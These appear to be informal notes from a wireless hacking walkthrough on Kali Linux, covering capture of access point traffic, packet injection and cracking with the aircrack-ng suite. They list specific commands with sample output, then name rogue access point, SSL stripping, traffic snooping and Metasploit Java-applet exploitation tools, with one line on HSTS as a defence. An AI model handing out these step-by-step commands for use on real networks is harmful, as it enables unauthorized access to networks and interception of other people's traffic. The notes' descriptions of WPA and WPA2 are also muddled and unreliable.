.. if you dont find any interface which will work for the command
.. airodump-ng mon0 then better start kismet which will creat one 
.. mon0mon monitor interfacce for you and you can then run the command
.. airodump-ng mon0mon like the follwoing

root@kali# airodump-ng mon0mon

.. the above command will show all the BSSID along with all the channels
.. and encryptions of the AP.

root@kali# airodump-ng --channel 10 -w capture --bssid D0:17:C2:3D:CA:A0 --ignore-negative-one mon0mon

root@kali# aireplay-ng -1 1000 -q 10 -e D0:17:C2:3D:CA:A0 -a D0:17:C2:3D:CA:A0 --ignore-negative-one mon0mon

No source MAC (-h) specified. Using the device MAC (E0:B9:A5:7F:56:1D)
16:32:37  Waiting for beacon frame (BSSID: D0:17:C2:3D:CA:A0) on channel -1

Attack was unsuccessful. Possible reasons:

    * Perhaps MAC address filtering is enabled.
    * Check that the BSSID (-a option) is correct.
    * Try to change the number of packets (-o option).
    * The driver/card doesn't support injection.
    * This attack sometimes fails against some APs.
    * The card is not on the same channel as the AP.
    * You're too far from the AP. Get closer, or lower
      the transmit rate.

... see aireplay-ng --help for more details.

.. then type the followings

aireplay-ng -3 -b D0:17:C2:3D:CA:A0 -h 00:11:22:33:44:55 --ignore-negative-one mon0mon

The interface MAC (E0:B9:A5:7F:56:1D) doesn't match the specified MAC (-h).

.. try to crack the pcap file

 aircrack-ng capture-01.cap

.. trying to crack wpa and wpa2. wpa and wpa2 is different algorithm to protect
.. the wireless network. wpa uses tkip while wpa2 uses tkip and aes both.
.. wpa2 uses the wpa2-psk(aes) for business and wpa2-personal aes for home user.
.. it is also recommend to use eap instead of psk

.. if successful to crack wpa key by using this tools you will get the wpa

.. kermasploit: which is used to do mitm can configure and offer rougue AP to 
.. connect and it them exploit the user based on metasploit vulnerability. this
.. can be downloaded from git clone git://github.com/SilverFoxx/PwnSTAR.git
.. setup is easy.

.. jasager is another wireless tools to audit and xploit wireless network.
.. sslstrip 
.. urlsnarf is another tool to allow attacker to see which websites
.. are viewed by the victims.
.. to prevent any of this happens on you, you can use http strict transport 
.. security(HSTS) which prevent https from downgrading the security when
.. any cockie or browser hijacking happens.

.. java signed applet is another plugins in metasploit which will creat
.. one vulnerable website which will exploit the client windows machine if 
.. he visits the site with absolute java plugins.
